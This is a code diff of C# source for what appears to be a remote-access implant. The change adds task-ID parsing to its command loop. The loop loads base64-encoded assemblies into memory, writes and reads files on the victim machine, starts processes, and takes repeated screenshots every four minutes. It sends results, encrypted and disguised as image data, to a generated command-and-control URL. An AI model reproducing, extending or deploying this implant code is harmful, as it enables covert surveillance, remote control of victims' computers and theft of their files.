@@ -376,51 +376,53 @@ public class Program
 					var split = splitcmd.Split(new string[] { "!d-3dion@LD!-d" }, StringSplitOptions.RemoveEmptyEntries);
 					foreach (string c in split)
 					{
-						tasksrc = c;
-						if (c.ToLower().StartsWith("exit"))
+						var taskId = c.Substring(0, 5);
+						cmd = c.Substring(5, c.Length - 5);
+						tasksrc = cmd;
+						if (cmd.ToLower().StartsWith("exit"))
 						{
 							exitvt.Set();
 							break;
 						}
-						else if (c.ToLower().StartsWith("loadmodule"))
+						else if (cmd.ToLower().StartsWith("loadmodule"))
 						{
-							var module = Regex.Replace(c, "loadmodule", "", RegexOptions.IgnoreCase);
+							var module = Regex.Replace(cmd, "loadmodule", "", RegexOptions.IgnoreCase);
 							var assembly = System.Reflection.Assembly.Load(System.Convert.FromBase64String(module));
 							output.AppendLine("Module loaded sucessfully");
-							tasksrc = "Module loaded sucessfully";
 						}
-						else if (c.ToLower().StartsWith("upload-file"))
+						else if (cmd.ToLower().StartsWith("upload-file"))
 						{
-							var path = Regex.Replace(c, "upload-file", "", RegexOptions.IgnoreCase);
+							var path = Regex.Replace(cmd, "upload-file", "", RegexOptions.IgnoreCase);
 							var splitargs = path.Split(new string[] { ";" }, StringSplitOptions.RemoveEmptyEntries);
 							Console.WriteLine("Uploaded file to: " + splitargs[1]);
 							var fileBytes = Convert.FromBase64String(splitargs[0]);
 							System.IO.File.WriteAllBytes(splitargs[1].Replace("\"", ""), fileBytes);
 							tasksrc = "Uploaded file sucessfully";
 						}
-						else if (c.ToLower().StartsWith("download-file"))
+						else if (cmd.ToLower().StartsWith("download-file"))
 						{
-							var path = Regex.Replace(c, "download-file ", "", RegexOptions.IgnoreCase);
+							var path = Regex.Replace(cmd, "download-file ", "", RegexOptions.IgnoreCase);
 							var file = File.ReadAllBytes(path.Replace("\"", ""));
 							var fileChuck = Combine(Encoding.ASCII.GetBytes("0000100001"), file);
 	
-							var dtask = Encryption(Key, c);
+							var eTaskId = Encryption(Key, taskId);
 							var dcoutput = Encryption(Key, "", true, fileChuck);
 							var doutputBytes = System.Convert.FromBase64String(dcoutput);
 							var dsendBytes = ImgGen.GetImgData(doutputBytes);
-							GetWebRequest(dtask).UploadData(UrlGen.GenerateUrl(), dsendBytes);
+							GetWebRequest(eTaskId).UploadData(UrlGen.GenerateUrl(), dsendBytes);
+							continue;
 						}
-						else if (c.ToLower().StartsWith("get-screenshotmulti"))
+						else if (cmd.ToLower().StartsWith("get-screenshotmulti"))
 						{
 							bool sShot = true;
 							int sShotCount = 1;
 							while(sShot) {
 								var sHot = RunAssembly("run-exe Core.Program Core get-screenshot");
-								var dtask = Encryption(Key, c);
+								var eTaskId = Encryption(Key, taskId);
 								var dcoutput = Encryption(Key, strOutput.ToString(), true);
 								var doutputBytes = System.Convert.FromBase64String(dcoutput);
 								var dsendBytes = ImgGen.GetImgData(doutputBytes);
-								GetWebRequest(dtask).UploadData(UrlGen.GenerateUrl(), dsendBytes);
+								GetWebRequest(eTaskId).UploadData(UrlGen.GenerateUrl(), dsendBytes);
 								Thread.Sleep(240000);
 								sShotCount++;
 								if (sShotCount > 100) {
@@ -431,21 +433,22 @@ public class Program
 									output.Append("[+] Multi Screenshot Ran Sucessfully");
 								}
 							}
+							continue;
 						}
-						else if (c.ToLower().StartsWith("listmodules"))
+						else if (cmd.ToLower().StartsWith("listmodules"))
 						{
 							var appd = AppDomain.CurrentDomain.GetAssemblies();
 							output.AppendLine("[+] Modules loaded:").AppendLine("");
 							foreach (var ass in appd)
 								output.AppendLine(ass.FullName.ToString());
 						}
-						else if (c.ToLower().StartsWith("run-dll") || c.ToLower().StartsWith("run-exe"))
+						else if (cmd.ToLower().StartsWith("run-dll") || cmd.ToLower().StartsWith("run-exe"))
 						{
-							output.AppendLine(RunAssembly(c));
+							output.AppendLine(RunAssembly(cmd));
 						}
-						else if (c.ToLower().StartsWith("start-process"))
+						else if (cmd.ToLower().StartsWith("start-process"))
 						{
-							var proc = c.Replace("'", "").Replace("\"", "");
+							var proc = cmd.Replace("'", "").Replace("\"", "");
 							var pstart = Regex.Replace(proc, "start-process ", "", RegexOptions.IgnoreCase);
 							pstart = Regex.Replace(pstart, "-argumentlist(.*)", "", RegexOptions.IgnoreCase);
 							var args = Regex.Replace(proc, "(.*)argumentlist ", "", RegexOptions.IgnoreCase);
@@ -458,7 +461,7 @@ public class Program
 							output.AppendLine(p.StandardOutput.ReadToEnd()).AppendLine(p.StandardError.ReadToEnd());
 							p.WaitForExit();
 						}
-						else if (c.ToLower().StartsWith("setbeacon") || c.ToLower().StartsWith("beacon"))
+						else if (cmd.ToLower().StartsWith("setbeacon") || cmd.ToLower().StartsWith("beacon"))
 						{
 							var bcnRgx = new Regex(@"(?<=(setbeacon|beacon)\s{1,})(?<t>[0-9]{1,9})(?<u>[h,m,s]{0,1})", RegexOptions.Compiled | RegexOptions.IgnoreCase);
 							var mch = bcnRgx.Match(c);
@@ -482,19 +485,19 @@ public class Program
 						output.AppendLine(strOutput.ToString());
 						var sb = strOutput.GetStringBuilder();
 						sb.Remove(0, sb.Length);
-						if (tasksrc.Length > 200)
+						if (tasksrc.Length > 200) // This is not used?
 							tasksrc = tasksrc.Substring(0, 199);
-						var task = Encryption(Key, tasksrc);
+						var enTaskId = Encryption(Key, taskId);
 						var coutput = Encryption(Key, output.ToString(), true);
 						var outputBytes = System.Convert.FromBase64String(coutput);
 						var sendBytes = ImgGen.GetImgData(outputBytes);
-						GetWebRequest(task).UploadData(UrlGen.GenerateUrl(), sendBytes);
+						GetWebRequest(enTaskId).UploadData(UrlGen.GenerateUrl(), sendBytes);
 					}
 				}
 			}
 			catch (Exception e)
 			{
-				var task = Encryption(Key, "Error");
+				var task = Encryption(Key, "Error"); 
 				var eroutput = Encryption(Key, $"Error: {output.ToString()} {e}", true);
 				var outputBytes = System.Convert.FromBase64String(eroutput);
 				var sendBytes = ImgGen.GetImgData(outputBytes);
